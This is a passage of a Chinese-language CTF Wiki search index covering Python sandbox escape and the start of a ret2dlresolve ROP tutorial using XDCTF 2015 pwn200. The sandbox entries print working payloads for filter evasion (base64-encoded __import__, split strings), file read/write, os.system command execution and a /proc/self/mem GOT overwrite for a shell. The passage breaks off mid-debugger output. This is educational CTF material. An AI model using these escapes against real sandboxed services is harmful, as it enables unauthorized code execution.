\u6216\u4ee5\u767d\u540d\u5355\u7684\u5f62\u5f0f\u53ea\u5141\u8bb8\u7528\u6237\u4f7f\u7528\u6c99\u7bb1\u63d0\u4f9b\u7684\u6a21\u5757\uff0c\u7528\u4ee5\u963b\u6b62\u7528\u6237\u7684\u5371\u9669\u64cd\u4f5c\u3002\u800c\u5982\u4f55\u8fdb\u4e00\u6b65\u9003\u9038\u6c99\u7bb1\u5c31\u662f\u6211\u4eec\u7684\u91cd\u70b9\u7814\u7a76\u5185\u5bb9\u3002","title":"\u5bfc\u5165\u6a21\u5757"},{"location":"pwn/sandbox/python-sandbox-escape/#python_2","text":"\u5f53\u6211\u4eec\u4e0d\u80fd\u5bfc\u5165\u6a21\u5757\uff0c\u6216\u8005\u60f3\u8981\u5bfc\u5165\u7684\u6a21\u5757\u88ab\u7981\uff0c\u90a3\u4e48\u6211\u4eec\u53ea\u80fd\u5bfb\u6c42 Python \u672c\u8eab\u5185\u7f6e\u51fd\u6570\uff08\u5373\u901a\u5e38\u4e0d\u7528\u4eba\u4e3a\u5bfc\u5165\uff0cPython\u672c\u8eab\u9ed8\u8ba4\u5df2\u7ecf\u5bfc\u5165\u7684\u51fd\u6570\uff09\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u53ef\u4ee5\u901a\u8fc7 dir __builtin__ \u6765\u83b7\u53d6\u5185\u7f6e\u51fd\u6570\u5217\u8868 >>> dir ( __builtins__ ) [ 'ArithmeticError' , 'AssertionError' , 'AttributeError' , 'BaseException' , 'BufferError' , 'BytesWarning' , 'DeprecationWarning' , 'EOFError' , 'Ellipsis' , 'EnvironmentError' , 'Exception' , 'False' , 'FloatingPointError' , 'FutureWarning' , 'GeneratorExit' , 'IOError' , 'ImportError' , 'ImportWarning' , 'IndentationError' , 'IndexError' , 'KeyError' , 'KeyboardInterrupt' , 'LookupError' , 'MemoryError' , 'NameError' , 'None' , 'NotImplemented' , 'NotImplementedError' , 'OSError' , 'OverflowError' , 'PendingDeprecationWarning' , 'ReferenceError' , 'RuntimeError' , 'RuntimeWarning' , 'StandardError' , 'StopIteration' , 'SyntaxError' , 'SyntaxWarning' , 'SystemError' , 'SystemExit' , 'TabError' , 'True' , 'TypeError' , 'UnboundLocalError' , 'UnicodeDecodeError' , 'UnicodeEncodeError' , 'UnicodeError' , 'UnicodeTranslateError' , 'UnicodeWarning' , 'UserWarning' , 'ValueError' , 'Warning' , 'ZeroDivisionError' , '_' , '__debug__' , '__doc__' , '__import__' , '__name__' , '__package__' , 'abs' , 'all' , 'any' , 'apply' , 'basestring' , 'bin' , 'bool' , 'buffer' , 'bytearray' , 'bytes' , 'callable' , 'chr' , 'classmethod' , 'cmp' , 'coerce' , 'compile' , 'complex' , 'copyright' , 'credits' , 'delattr' , 'dict' , 'dir' , 'divmod' , 'enumerate' , 'eval' , 'execfile' , 'exit' , 'file' , 'filter' , 'float' , 'format' , 'frozenset' , 'getattr' , 'globals' , 'hasattr' , 'hash' , 'help' , 'hex' , 'id' , 'input' , 'int' , 'intern' , 'isinstance' , 'issubclass' , 'iter' , 'len' , 'license' , 'list' , 'locals' , 'long' , 'map' , 'max' , 'memoryview' , 'min' , 'next' , 'object' , 'oct' , 'open' , 'ord' , 'pow' , 'print' , 'property' , 'quit' , 'range' , 'raw_input' , 'reduce' , 'reload' , 'repr' , 'reversed' , 'round' , 'set' , 'setattr' , 'slice' , 'sorted' , 'staticmethod' , 'str' , 'sum' , 'super' , 'tuple' , 'type' , 'unichr' , 'unicode' , 'vars' , 'xrange' , 'zip' ] \u5728Python\u4e2d\uff0c\u4e0d\u5f15\u5165\u76f4\u63a5\u4f7f\u7528\u7684\u5185\u7f6e\u51fd\u6570\u88ab\u6210\u4e3a builtin \u51fd\u6570\uff0c\u968f\u7740 __builtin__ \u8fd9\u4e2a\u6a21\u5757\u81ea\u52a8\u5f15\u5165\u5230\u73af\u5883\u4e2d\u3002\u90a3\u4e48\u6211\u4eec\u5982\u4f55\u5f15\u5165\u7684\u6a21\u5757\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 __dict__ \u5f15\u5165\u6211\u4eec\u60f3\u8981\u5f15\u5165\u7684\u6a21\u5757\u3002 __dict__ \u7684\u4f5c\u7528\u662f\u5217\u51fa\u4e00\u4e2a\u6a21\u7ec4/\u7c7b/\u5bf9\u8c61 \u4e0b\u9762 \u6240\u6709\u7684\u5c5e\u6027\u548c\u51fd\u6570\u3002\u8fd9\u5728\u6c99\u76d2\u9003\u9038\u4e2d\u662f\u5f88\u6709\u7528\u7684,\u53ef\u4ee5\u627e\u5230\u9690\u85cf\u5728\u5176\u4e2d\u7684\u4e00\u4e9b\u4e1c\u897f __dict__ \u80fd\u505a\u4ec0\u4e48\u5462\uff1f \u6211\u4eec\u77e5\u9053\uff0c\u4e00\u4e2a\u6a21\u5757\u5bf9\u8c61\u6709\u4e00\u4e2a\u7531\u5b57\u5178\u5bf9\u8c61\u5b9e\u73b0\u7684\u547d\u540d\u7a7a\u95f4\uff0c\u5c5e\u6027\u7684\u5f15\u7528\u4f1a\u88ab\u8f6c\u6362\u4e3a\u8fd9\u4e2a\u5b57\u5178\u4e2d\u7684\u67e5\u627e\uff0c\u4f8b\u5982\uff0cm.x \u7b49\u540c\u4e8e m.dict[\"x\"]\u3002 \u7ed5\u8fc7\u5b9e\u4f8b\uff1a \u9996\u5148\u901a\u8fc7 base64 \u7ed5\u8fc7\u5b57\u7b26\u660e\u6587\u68c0\u6d4b >>> import base64 >>> base64 . b64encode ( '__import__' ) 'X19pbXBvcnRfXw==' >>> base64 . b64encode ( 'os' ) 'b3M=' \u7136\u540e\u901a\u8fc7 __dict__ \u5f15\u7528 >>> __builtins__ . __dict__ [ 'X19pbXBvcnRfXw==' . decode ( 'base64' )]( 'b3M=' . decode ( 'base64' )) \u5982\u679c\u4e00\u4e9b \u5185\u655b\u51fd\u6570\u5728 builtins \u5220\u9664 \uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 reload( builtins ) \u91cd\u65b0\u8f7d\u5165\u83b7\u53d6\u4e00\u4e2a\u5b8c\u6574\u7684 builtins","title":"Python \u7684\u5185\u5efa\u51fd\u6570"},{"location":"pwn/sandbox/python-sandbox-escape/#_2","text":"Python \u7684 object \u7c7b\u4e2d\u96c6\u6210\u4e86\u5f88\u591a\u7684\u57fa\u7840\u51fd\u6570\uff0c\u6211\u4eec\u60f3\u8981\u8c03\u7528\u7684\u65f6\u5019\u4e5f\u662f\u53ef\u4ee5\u901a\u8fc7\u521b\u5efa\u5bf9\u8c61\u8fdb\u800c\u5f15\u7528\u3002 \u6211\u4eec\u6709\u5e38\u89c1\u7684\u4e24\u4e2a\u65b9\u6cd5\uff1a () .__class__.__bases__ [ 0 ] '' .__class__.__mro__ [ 2 ] \u5982\uff0c\u6211\u4eec\u53ef\u901a\u8fc7 print ().__class__.__bases__[0].__subclasses__()[40](\"/etc/services\").read() \u8fbe\u5230\u6587\u4ef6\u8bfb\u53d6\u7684\u6548\u679c\uff0c \u5e38\u89c1payload #\u8bfb\u6587\u4ef6 () . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( r 'C:\\1.php' ) . read () #\u5199\u6587\u4ef6 () . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( '/var/www/html/input' , 'w' ) . write ( '123' ) #\u6267\u884c\u4efb\u610f\u547d\u4ee4 () . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 59 ] . __init__ . func_globals . values ()[ 13 ][ 'eval' ]( '__import__(\"os\").popen(\"ls /var/www/html\").read()' )","title":"\u521b\u5efa\u5bf9\u8c61\u4ee5\u53ca\u5f15\u7528"},{"location":"pwn/sandbox/python-sandbox-escape/#_3","text":"\u5728\u6709\u4e9b\u9898\u76ee\u4e2d\uff0c\u5982\u8fd9\u6b21\u76842018\u5e74\u56fd\u8d5b\u7684 Python \u6c99\u76d2\u9898\u76ee\u4e0a\uff0cimport \u5176\u5b9e\u6574\u4e2a\u662f\u88ab\u9609\u5272\u4e86\u3002\u4f46\u662f\u5728 Python \u4e2d\uff0c\u539f\u751f\u7684 __import__ \u662f\u5b58\u5728\u88ab\u5f15\u7528\u7684\uff0c\u53ea\u8981\u6211\u4eec\u627e\u5230\u76f8\u5173\u5bf9\u8c61\u5f15\u7528\u5c31\u53ef\u4ee5\u8fdb\u4e00\u6b65\u83b7\u53d6\u6211\u4eec\u60f3\u8981\u7684\u5185\u5bb9\uff0c\u5177\u4f53\u4e0b\u9762\u7684demo\u4f1a\u8bb2\u8ff0\u5230","title":"\u95f4\u63a5\u5f15\u7528"},{"location":"pwn/sandbox/python-sandbox-escape/#writegot","text":"\u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a /proc/self/mem \u7684\u5185\u5b58\u64cd\u4f5c\u65b9\u6cd5 /proc/self/mem \u662f\u5185\u5b58\u955c\u50cf\uff0c\u80fd\u591f\u901a\u8fc7\u5b83\u6765\u8bfb\u5199\u5230\u8fdb\u7a0b\u7684\u6240\u6709\u5185\u5b58\uff0c\u5305\u62ec\u53ef\u6267\u884c\u4ee3\u7801\uff0c\u5982\u679c\u6211\u4eec\u80fd\u83b7\u53d6\u5230Python\u4e00\u4e9b\u51fd\u6570\u7684\u504f\u79fb\uff0c\u5982 system \uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u901a\u8fc7\u8986\u5199 got \u8868\u8fbe\u5230 getshell\u7684\u76ee\u7684\u3002 ( lambda r , w : r . seek ( 0x08de2b8 ) or w . seek ( 0x08de8c8 ) or w . write ( r . read ( 8 )) or () . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( 'c' + 'at /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb' ))(() . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( '/proc/self/mem' , 'r' ),() . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( '/proc/self/mem' , 'w' , 0 )) \u7b2c\u4e00\u4e2a\u5730\u5740\u662f system \u7684\u504f\u79fb\uff0c\u7b2c\u4e8c\u4e2a\u662ffopen\u7684\u504f\u79fb\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 objdump \u83b7\u53d6\u76f8\u5173\u4fe1\u606f","title":"write\u4fee\u6539got\u8868"},{"location":"pwn/sandbox/python-sandbox-escape/#_4","text":"2018 ciscn \u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b\u4e2d\u7684 Python \u6c99\u7bb1\u9003\u9038\u3002 \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 print ().__class__.__bases__[0].__subclasses__()[40](\"/home/ctf/sandbox.py\").read() \u83b7\u53d6\u9898\u76ee\u6e90\u7801\uff0c\u7136\u540e\u53ef\u4ee5\u8fdb\u4e00\u6b65\u5206\u6790\uff0c\u4ee5\u4e0b\u63d0\u4f9b\u4e09\u79cd\u9003\u9038\u65b9\u6cd5\u3002","title":"\u4f8b\u5b50"},{"location":"pwn/sandbox/python-sandbox-escape/#python_3","text":"x = [ x for x in [] . __class__ . __base__ . __subclasses__ () if x . __name__ == 'ca' + 'tch_warnings' ][ 0 ] . __init__ x . __getattribute__ ( \"func_global\" + \"s\" )[ 'linecache' ] . __dict__ [ 'o' + 's' ] . __dict__ [ 'sy' + 'stem' ]( 'l' + 's' ) x . __getattribute__ ( \"func_global\" + \"s\" )[ 'linecache' ] . __dict__ [ 'o' + 's' ] . __dict__ [ 'sy' + 'stem' ]( 'l' + 's /home/ctf' ) x . __getattribute__ ( \"func_global\" + \"s\" )[ 'linecache' ] . __dict__ [ 'o' + 's' ] . __dict__ [ 'sy' + 'stem' ]( 'ca' + 't /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb' )","title":"\u521b\u5efa\u5bf9\u8c61\u5e76\u5229\u7528 Python \u64cd\u4f5c\u5b57\u7b26\u4e32\u7684\u7279\u6027"},{"location":"pwn/sandbox/python-sandbox-escape/#got-getshell","text":"( lambda r , w : r . seek ( 0x08de2b8 ) or w . seek ( 0x08de8c8 ) or w . write ( r . read ( 8 )) or () . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( 'l' + 's /home/ctf/' ))(() . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( '/proc/self/mem' , 'r' ),() . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( '/proc/self/mem' , 'w' , 0 )) ( lambda r , w : r . seek ( 0x08de2b8 ) or w . seek ( 0x08de8c8 ) or w . write ( r . read ( 8 )) or () . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( 'c' + 'at /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb' ))(() . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( '/proc/self/mem' , 'r' ),() . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( '/proc/self/mem' , 'w' , 0 ))","title":"\u52ab\u6301 got \u8868 getshell"},{"location":"pwn/sandbox/python-sandbox-escape/#import","text":"\u5728\u4e0d\u65ad\u7684 dir \u8fc7\u7a0b\u4e2d\uff0c\u53d1\u73b0 closure \u8fd9\u4e2a object \u4fdd\u5b58\u4e86\u53c2\u6570\uff0c\u53ef\u4ee5\u5f15\u7528\u539f\u751f\u7684 import print __import__ . __getattribute__ ( '__clo' + 'sure__' )[ 0 ] . cell_contents ( 'o' + 's' ) . __getattribute__ ( 'sy' + 'stem' )( 'l' + 's home' )","title":"\u5bfb\u627e import \u7684\u95f4\u63a5\u5f15\u7528"},{"location":"pwn/sandbox/python-sandbox-escape/#_5","text":"https://xz.aliyun.com/t/52#toc-10 https://blog.csdn.net/qq_35078631/article/details/78504415 https://www.anquanke.com/post/id/85571 http://bestwing.me/2018/05/03/awesome-python-sandbox-in-ciscn/#0x01","title":"\u53c2\u8003"},{"location":"pwn/stackoverflow/advanced_rop/","text":"\u9ad8\u7ea7ROP \u00b6 \u9ad8\u7ea7ROP\u5176\u5b9e\u548c\u4e00\u822c\u7684ROP\u57fa\u672c\u4e00\u6837\uff0c\u5176\u4e3b\u8981\u7684\u533a\u522b\u5728\u4e8e\u5b83\u5229\u7528\u4e86\u4e00\u4e9b\u66f4\u52a0\u5e95\u5c42\u7684\u539f\u7406\u3002 ret2_dl_runtime_resolve \u00b6 \u539f\u7406 \u00b6 \u8981\u60f3\u5f04\u61c2\u8fd9\u4e2aROP\u5229\u7528\u6280\u5de7\uff0c\u9700\u8981\u9996\u5148\u7406\u89e3ELF\u6587\u4ef6\u7684\u57fa\u672c\u7ed3\u6784\uff0c\u4ee5\u53ca\u52a8\u6001\u94fe\u63a5\u7684\u57fa\u672c\u8fc7\u7a0b\uff0c\u8bf7\u53c2\u8003executable\u4e2delf\u5bf9\u5e94\u7684\u4ecb\u7ecd\u3002\u8fd9\u91cc\u6211\u53ea\u7ed9\u51fa\u76f8\u5e94\u7684\u5229\u7528\u65b9\u5f0f\u3002 \u6211\u4eec\u77e5\u9053\u5728linux\u4e2d\u662f\u5229\u7528_dl_runtime_resolve(link_map_obj, reloc_index)\u6765\u5bf9\u52a8\u6001\u94fe\u63a5\u7684\u51fd\u6570\u8fdb\u884c\u91cd\u5b9a\u4f4d\u7684\u3002\u90a3\u4e48\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u76f8\u5e94\u7684\u53c2\u6570\u4ee5\u53ca\u5176\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5bb9\u662f\u4e0d\u662f\u5c31\u53ef\u4ee5\u63a7\u5236\u89e3\u6790\u7684\u51fd\u6570\u4e86\u5462\uff1f\u7b54\u6848\u662f\u80af\u5b9a\u7684\u3002\u5177\u4f53\u5229\u7528\u65b9\u5f0f\u5982\u4e0b \u63a7\u5236\u7a0b\u5e8f\u6267\u884cdl_resolve\u51fd\u6570 \u7ed9\u5b9aLink_map\u4ee5\u53caindex\u4e24\u4e2a\u53c2\u6570\u3002 \u5f53\u7136\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u7ed9\u5b9a plt0\u5bf9\u5e94\u7684\u6c47\u7f16\u4ee3\u7801\uff0c\u8fd9\u65f6\uff0c\u6211\u4eec\u5c31\u53ea\u9700\u8981\u4e00\u4e2aindex\u5c31\u8db3\u591f\u4e86\u3002 \u63a7\u5236index\u7684\u5927\u5c0f\uff0c\u4ee5\u4fbf\u4e8e\u6307\u5411\u81ea\u5df1\u6240\u63a7\u5236\u7684\u533a\u57df\uff0c\u4ece\u800c\u4f2a\u9020\u4e00\u4e2a\u6307\u5b9a\u7684\u91cd\u5b9a\u4f4d\u8868\u9879\u3002 \u4f2a\u9020\u91cd\u5b9a\u4f4d\u8868\u9879\uff0c\u4f7f\u5f97\u91cd\u5b9a\u4f4d\u8868\u9879\u6240\u6307\u7684\u7b26\u53f7\u4e5f\u5728\u81ea\u5df1\u53ef\u4ee5\u63a7\u5236\u7684\u8303\u56f4\u5185\u3002 \u4f2a\u9020\u7b26\u53f7\u5185\u5bb9\uff0c\u4f7f\u5f97\u7b26\u53f7\u5bf9\u5e94\u7684\u540d\u79f0\u4e5f\u5728\u81ea\u5df1\u53ef\u4ee5\u63a7\u5236\u7684\u8303\u56f4\u5185\u3002 \u6b64\u5916\uff0c\u8fd9\u4e2a\u653b\u51fb\u6210\u529f\u7684\u5f88\u5fc5\u8981\u7684\u6761\u4ef6 dl_resolve\u51fd\u6570\u4e0d\u4f1a\u68c0\u67e5\u5bf9\u5e94\u7684\u7b26\u53f7\u662f\u5426\u8d8a\u754c\uff0c\u5b83\u53ea\u4f1a\u6839\u636e\u6211\u4eec\u6240\u7ed9\u5b9a\u7684\u6570\u636e\u6765\u6267\u884c\u3002 dl_resolve\u51fd\u6570\u6700\u540e\u7684\u89e3\u6790\u6839\u672c\u4e0a\u4f9d\u8d56\u4e8e\u6240\u7ed9\u5b9a\u7684\u5b57\u7b26\u4e32\u3002 \u6ce8\u610f\uff1a \u7b26\u53f7\u7248\u672c\u4fe1\u606f \u6700\u597d\u4f7f\u5f97ndx = VERSYM[ (reloc->r_info) >> 8] \u7684\u503c\u4e3a0\uff0c\u4ee5\u4fbf\u4e8e\u9632\u6b62\u627e\u4e0d\u5230\u7684\u60c5\u51b5\u3002 \u91cd\u5b9a\u4f4d\u8868\u9879 r_offset\u5fc5\u987b\u662f\u53ef\u5199\u7684\uff0c\u56e0\u4e3a\u5f53\u89e3\u6790\u5b8c\u51fd\u6570\u540e\uff0c\u5fc5\u987b\u628a\u76f8\u5e94\u51fd\u6570\u7684\u5730\u5740\u586b\u5165\u5230\u5bf9\u5e94\u7684\u5730\u5740\u3002 \u653b\u51fb\u6761\u4ef6 \u00b6 \u8bf4\u4e86\u8fd9\u4e48\u591a\uff0c\u8fd9\u4e2a\u5229\u7528\u6280\u5de7\u5176\u5b9e\u8fd8\u662fROP\uff0c\u540c\u6837\u53ef\u4ee5\u7ed5\u8fc7NX\u548cASLR\u4fdd\u62a4\u3002\u4f46\u662f\uff0c\u8fd9\u4e2a\u653b\u51fb\u66f4\u9002\u4e8e\u4e00\u4e9b\u6bd4\u8f83\u7b80\u5355\u7684\u6808\u6ea2\u51fa\u7684\u60c5\u51b5\uff0c\u4f46\u540c\u65f6\u53c8\u96be\u4ee5\u6cc4\u9732\u83b7\u53d6\u66f4\u591a\u4fe1\u606f\u7684\u60c5\u51b5\u4e0b\u3002 \u793a\u4f8b \u00b6 \u8fd9\u91cc\u4ee5XDCTF 2015\u7684pwn200\u4e3a\u4f8b\u3002\u4e3b\u8981\u53c2\u8003 http://pwn4.fun/2016/11/09/Return-to-dl-resolve/ \uff0c\u6df1\u5165\u6d45\u51fa\u3002 https://www.math1as.com/index.php/archives/341/ \u9996\u5148\u6211\u4eec\u53ef\u4ee5\u7f16\u8bd1\u4e0bret2dlresolve\u6587\u4ef6\u5939\u4e0b\u7684\u6e90\u6587\u4ef6main.c\u6587\u4ef6\u5f97\u5230\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u8fd9\u91cc\u53d6\u6d88\u4e86Canary\u4fdd\u62a4\u3002 \u279c ret2dlresolve git: ( master ) \u2717 gcc main.c -m32 -fno-stack-protector -o main \u5728\u4e0b\u9762\u7684\u8bb2\u89e3\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4f1a\u6309\u7167\u4ee5\u4e24\u79cd\u4e0d\u540c\u7684\u65b9\u6cd5\u6765\u8fdb\u884c\u8bb2\u89e3\u3002\u5176\u4e2d\u7b2c\u4e00\u79cd\u65b9\u6cd5\u6bd4\u8f83\u9ebb\u70e6\uff0c\u4f46\u662f\u53ef\u4ee5\u4ed4\u7ec6\u7406\u89e3ret2dlresolve\u7684\u539f\u7406\uff0c\u7b2c\u4e8c\u79cd\u65b9\u6cd5\u5219\u662f\u76f4\u63a5\u4f7f\u7528\u5df2\u6709\u7684\u5de5\u5177\uff0c\u76f8\u5bf9\u5bb9\u6613\u4e00\u70b9\u3002 \u5229\u7528\u6b63\u5e38\u7684\u4ee3\u7801\u6765\u4f7f\u7528\u8be5\u6280\u5de7\u4ece\u800c\u83b7\u53d6shell\u3002 stage 1 \u6d4b\u8bd5\u63a7\u5236\u7a0b\u5e8f\u6267\u884cwrite\u51fd\u6570\u7684\u6548\u679c\u3002 stage 2 \u6d4b\u8bd5\u63a7\u5236\u7a0b\u5e8f\u6267\u884cdl_resolve\u51fd\u6570\uff0c\u5e76\u4e14\u76f8\u5e94\u53c2\u6570\u6307\u5411\u6b63\u5e38write\u51fd\u6570\u7684plt\u65f6\u7684\u6267\u884c\u6548\u679c\u3002 stage 3 \u6d4b\u8bd5\u63a7\u5236\u7a0b\u5e8f\u6267\u884cdl_resolve\u51fd\u6570\uff0c\u5e76\u4e14\u76f8\u5e94\u53c2\u6570\u6307\u5411\u4f2a\u9020\u7684write\u51fd\u6570\u7684plt\u65f6\u7684\u6267\u884c\u6548\u679c\u3002 \u5229\u7528roputils\u4e2d\u5df2\u7ecf\u96c6\u6210\u597d\u7684\u5de5\u5177\u6765\u5b9e\u73b0\u653b\u51fb\uff0c\u4ece\u800c\u83b7\u53d6shell\u3002 \u6b63\u5e38\u653b\u51fb \u00b6 \u663e\u7136\u6211\u4eec\u7a0b\u5e8f\u6709\u4e00\u4e2a\u5f88\u660e\u663e\u7684\u6808\u6ea2\u51fa\u6f0f\u6d1e\u7684\u3002\u8fd9\u9898\u6211\u4eec\u4e0d\u8003\u8651\u6211\u4eec\u6709libc\u7684\u60c5\u51b5\u3002\u6211\u4eec\u53ef\u4ee5\u5f88\u5bb9\u6613\u7684\u5206\u6790\u51fa\u504f\u79fb\u4e3a112\u3002 gef \u27a4 pattern create 200 [+] Generating a pattern of 200 bytes aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab [+] Saved as ' $_gef0 ' gef \u27a4 r Starting program : / mnt / hgfs / Hack / ctf / ctf-wiki / pwn / stackoverflow / example / ret2dlresolve / main Welcome to XDCTF2015 ~ ! aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab Program received signal SIGSEGV , Segmentation fault. 0 x62616164 in ?? () \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ registers ] \u2500\u2500\u2500\u2500 $eax : 0x000000c9 $ebx : 0x00000000 $ecx : 0xffffcc6c \u2192 \" aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama [...] \" $edx : 0x00000100 $esp : 0xffffcce0 \u2192 \" eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa [...] \" $ebp : 0x62616163 ( \" caab \"? ) $esi : 0xf7fac000 \u2192 0x001b1db0 $edi : 0xffffcd50 \u2192 0xffffcd70 \u2192 0x00000001 $eip : 0x62616164 ( \" daab \"? ) $cs : 0x00000023 $ss : 0x0000002b $ds : 0x0000002b $es : 0x0000002b $fs : 0x00000000 $gs : 0x00000063 $eflags: [ carry PARITY adjust zero SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code: i386 ] \u2500\u2500\u2500\u2500 [!] Cannot disassemble from $PC \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ] \u2500\u2500\u2500\u2500 ['0 xffffcce0 ' , ' l8 ' ] 8 0 xffffcce0 \u2502+ 0x00 : \" eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa [...] \" \u2190 $esp 0 xffffcce4 \u2502+ 0x04 : \" faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabra [...] \" 0 xffffcce8 \u2502+ 0x08 : \" gaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsa [...] \" 0 xffffccec \u2502+ 0x0c : \" haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabta [...] \" 0 xffffccf0 \u2502+ 0x10 : \" 